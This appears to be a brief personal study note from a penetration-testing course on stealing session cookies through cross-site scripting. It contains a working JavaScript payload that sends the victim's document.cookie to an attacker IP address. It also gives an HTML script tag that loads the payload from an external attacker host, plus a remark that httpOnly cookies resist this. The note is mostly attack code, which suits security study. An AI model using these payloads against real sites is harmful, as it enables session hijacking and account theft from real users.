---
tags:
  - xss
---
# Stealing cookie XSS

How use external payload see here: [[2023042721181010 XSS external JS payload]]

! We can''t steal cookie with httpOnly
## Payload js script: 
```js
fetch("http://192.168.49.62/cookie?data=" + encodeURIComponent(document.cookie));
```

## Inject payload 
```html
<script src='http://192.168.49.55/xss.js'></script>
```

## References
1. web200.Cross-Site Scripting Exploitation and Case Study.Stealing Session Cookies
